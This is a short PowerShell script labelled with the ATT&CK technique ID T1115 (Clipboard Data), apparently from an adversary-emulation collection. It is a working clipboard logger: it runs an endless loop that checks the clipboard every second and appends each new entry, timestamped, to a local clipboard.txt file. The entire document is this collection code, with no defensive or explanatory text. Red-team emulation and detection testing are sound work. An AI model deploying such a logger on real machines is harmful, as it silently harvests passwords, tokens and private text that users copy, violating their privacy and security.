# T1115 - Clipboard Data

# Get clipboard content
$clipboard = Get-Clipboard
$date = Get-Date
$currentPath = (Get-Location).Path

# Create clipboard.txt file if it does not exist
if(-not (Test-Path -Path "$currentPath\clipboard.txt"))
{
    New-Item -Path "$currentPath\clipboard.txt" -ItemType File
}

# Loop forever to check for clipboard changes
while ($true) 
{
    if ($clipboard -ne (Get-Clipboard)) 
    {
        # Store new clipboard content
        $clipboard = Get-Clipboard
        $date = Get-Date
        
        # Append content to clipboard.txt
        $content = "$date : $clipboard"
        Add-Content -Value $content -Path "$currentPath\clipboard.txt"
    }
    Start-Sleep -Seconds 1
}
